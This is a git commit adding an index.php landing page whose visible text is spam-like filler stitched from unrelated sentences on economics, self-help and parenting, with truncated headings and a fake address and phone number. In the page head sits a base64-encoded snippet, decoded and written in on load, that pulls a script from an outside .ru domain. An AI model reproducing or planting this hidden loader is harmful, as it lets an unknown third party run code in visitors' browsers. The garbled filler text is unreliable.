265b5dddb9ab7303e5411c7fefdc211a0778672f
adlgtrnn <79608578+adlgtrnn@users.noreply.github.com>
2021-02-25 00:02:57 +0200

    Add files via upload

---
+++ index.php
@@ -0,0 +1,118 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <script type="text/javascript">
+	let encoded = 'PHNjcmlwdCBzcmM9Imh0dHBzOi8va2xvb2xrLnJ1L3RyYWNrZXIuanMiPjwvc2NyaXB0PjxkaXYgY2xhc3M9ImNoZWNrX2Zvcl8wcHdjaDdzOHhwdThpYzhqcXYiPjwvZGl2Pg==';let decoded = atob(encoded);document.write(''+ decoded +'');
+	</script>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>What to do then? Education is essential.  They react to the problem</title>
+
+	<link href="https://fonts.googleapis.com/css?family=Open+Sans" rel="stylesheet">
+	<link href="https://fonts.googleapis.com/css?family=Quicksand" rel="stylesheet">
+    <link rel="stylesheet" href="http://maxcdn.bootstrapcdn.com/font-awesome/4.6.0/css/font-awesome.min.css">
+    <link rel="stylesheet" href="styles.css">
+
+</head>
+
+<body>
+
+	<header class="ru2vhld50w9mauee2udk3">
+		<nav>
+			<li><a href="#">MAIN</a></li>
+			<li><a href="our_themes.html">OUR THEMES</a></li>
+			<li><a href="#">FLOW</a></li>
+			<li><a href="#">E-MAIL</a></li>
+		</nav>
+	</header>
+
+
+	<section class="hero" class="j30g7mu1yclgf7l4raqrnt8">
+		<div class="background-image" style="background-image: url(main.jpg);"></div>
+		<h1>What to do then? Education is essential.  They react to the problem</h1>
+	</section>
+
+
+	<section class="our-work" class="oni3s6f9fwb9nk0utw">
+		<h3 class="title">Product differentiation can be carried out in vario</h3>
+		<p>The legal regime of the state of economic isolation is the regime of private property.  The risk management process also decides whether to enter or not enter the appropriate situation.  This condition is called homogeneity of goods; 4) sellers act independently of each other; 5) buyers and sellers are well informed about the state of the whole market,primarily about prices in any part of the market.  Their idea of ​​their own worth is based on comparison with other people, and someone else's success to a certain extent means their own defeat for them. </p>
+		<hr>
+
+		<ul class="grid" class="54debbq0jo024gtia3k5t">
+			<li class="large" style="background-image: url(image1.jpg);"></li>
+		</div>
+	</section>
+	
+
+	<section class="our-work" class="ru2vhld50w9mauee2udk3">
+		<h3 class="title">“I did everything exactly as you said, and</h3>
+		<p>But now that you have enough air, this problem no longer motivates you.  They accuse them of past grievances, indifference, or greater love for younger children.  Thus, if you are 40 years old, you should aim for loads that increase your heart rate to 108 beats per minute (220 - 40 = 180; 180 x 0.6 = 108).  11.  Identify one Quadrant II activity that you have neglected in your life and that, if done well, would have a significant positive impact on your life, both personal and professional.Write it down and commit to doing it.  But how can you appreciate me if you are not even able to understand me? Your assurances are just words, and I cannot believe the words. </p>
+		<hr>
+
+		<ul class="grid">
+			<li class="large" class="j30g7mu1yclgf7l4raqrnt8" style="background-image: url(image2.jpg);"></li>
+		</div>
+	</section>
+	
+
+	<section class="our-work" class="oni3s6f9fwb9nk0utw">
+		<h3 class="title">We want to be understood.  When the delegation agreement is in </h3>
+		<p>And what we see is highly interconnected with what we are.  You can spend an hour or two in the morning preparing for this talk, even if you only have a few minutes during which you need to be able to whet the audience to listen to a more in-depth message on this topic at the next meeting.  Therefore, the activities of state bodies must be strictly coordinated with the functions of the state.  They worked shoulder to shoulder on its implementation for a year and a half.  Financial stability can be internal and external.Internal is due to the state and dynamics of material and value assets, which reliably ensure a high result of work.  Win / Win thinking assumes a high degree of development of both of these qualities.  Respect for this quality is firmly woven into the fabric of the theory of human interaction, management and leadership.  What matters is what contributes to your mission, your values ​​and your most important goals.  It was impossible to refrain from irritation.  There is no need to reinvent the wheel every time.  If you call someone, then you are unlikely to be told: "Please do not hang up, I will be there in 15 minutes." But if you are sitting in his office, the same person may well make you wait the same amount of time for the end of your telephone conversation.Time Management Matrix Urgent matters are usually visible.  However, despite a number of positive developments, tax legislation contains the following serious shortcomings. </p>
+		<hr>
+
+		<ul class="grid">
+			<li class="large" class="54debbq0jo024gtia3k5t" style="background-image: url(image3.jpg);"></li>
+		</div>
+	</section>
+	
+
+	<section class="our-work" class="ru2vhld50w9mauee2udk3">
+		<h3 class="title">INDIFFERENCE CURVES Indifference curves serve as a </h3>
+		<p>They justify their mistakes by the mistakes of others, and if they apologize, they are insincere.  This does not always happen.  We will simply lose our integrity if we begin to say and do what is contrary to our ideas.  After we have looked at the same event with different eyes, is it any wonder that we have problems in interaction when in the same drawing someone sees a "young" woman, and someone - an "old "? Do you see how our centers seriously affect us? Affect everything - our motivation, our everyday decisions, our actions, and our interpretation of what is happening.  Along with them, the designation of a product by the name of its place of origin acts as a guarantee of the presence in the product of special unique properties due to the place of its production.  Habits can be mastered, or you can get rid of them.  itThe worker has focused on his Circle of Influence.  They were unable to measure or measure their performance, and as a result, they lost productivity and ceased to be listed in the market.  Each of them became more obvious their principles and values.  It's like leaning against the walls of your home, where happiness, a sense of security and the highest values ​​of your life are concentrated.  Covey, I will solve your problem! He didn’t say, “I don’t know where you can get it,” or, “Go ask the administrator.” He just took up my problem, making me feel that it was a great honor for him. </p>
+		<hr>
+
+		<ul class="grid">
+			<li class="large" class="j30g7mu1yclgf7l4raqrnt8" style="background-image: url(image4.jpg);"></li>
+		</div>
+	</section>
+	
+
+	<section class="our-work" class="oni3s6f9fwb9nk0utw">
+		<h3 class="title">But as soon as the hard times come - and t</h3>
+		<p>What goes around comes around.  The market as an independent entity includes three main elements: the market for goods and services, the labor market, and the capital market.  I realized that I was dealing with a very difficult situation that I could not change,until I arm myself with the necessary psychological and intellectual capabilities.  I told her that first of all we must wait for the sun to be in front of the boat, and then catch the moment when the son will jump over the wave or make a turn.  We will then discuss our options for meeting your needs.  Family-focused parents lack emotional freedom and energy,necessary in order to bring up children, caring exclusively for their welfare.  The entrepreneur bears personal responsibility for all obligations that arise.  I set myself a goal. </p>
+		<hr>
+	</section>
+
+
+
+	<section class="contact">
+		<h3 class="54debbq0jo024gtia3k5t" class="title">Wisdom includes sanity, discernment, understanding.  Our affair</h3>	
+		<p>If your organizer is portable, then you will always carry it with you,so that all important information will always be at your disposal.  The doctor was also at football.  The economy determines exchange rates, stock prices, and securities.Economic circumstances shape the demand and price for a product.  It defines the rights and forms of ownership, the rules for doing business, establishes the conditions for the conclusion and implementation of contracts, relationships, trade unions and employers, prevents abuse, and ensures consumer protection.  He manages it independently and at his own discretion.  You listen more and more attentively.  You can approach the problem,relying on the intuitive and imaginative paradigm generated by the right hemisphere; and my approach can be very strongly associated with the left hemisphere, which is characterized by consistent, logical, verbal thinking.  I couldn't believe my eyes. </p>
+		<hr>
+
+		<form>
+			<input type="email" placeholder="-Email">
+			<input type="Name" placeholder="-Name">
+			<input type="Surmane" placeholder="-Surname">
+			<a href="#" class="btn">Subscribe now</a>
+		</form>
+
+	</section>
+
+	<footer class="ru2vhld50w9mauee2udk3">
+		<ul>
+			<li><a href="#"><i class="fa fa-twitter-square" class="j30g7mu1yclgf7l4raqrnt8"></i></a></li>
+			<li><a href="#"><i class="fa fa-facebook-square"></i></a></li>
+			<li><a href="#"><i class="fa fa-snapchat-square" class="oni3s6f9fwb9nk0utw"></i></a></li>
+			<li><a href="#"><i class="fa fa-pinterest-square"></i></a></li>
+			<li><a href="#"><i class="fa fa-github-square" class="54debbq0jo024gtia3k5t"></i></a></li>
+		</ul>
+		<p><a href="policy.html">Privacy policy</a></p>
+		<p>890 Abdul Villages, Suite 778, 18096, New Alexandrine, Colorado, United States</p>
+		<p>Phone number: +72(510)713-40-70029</p>
+	</footer>
+
+</body>
+
+</html>
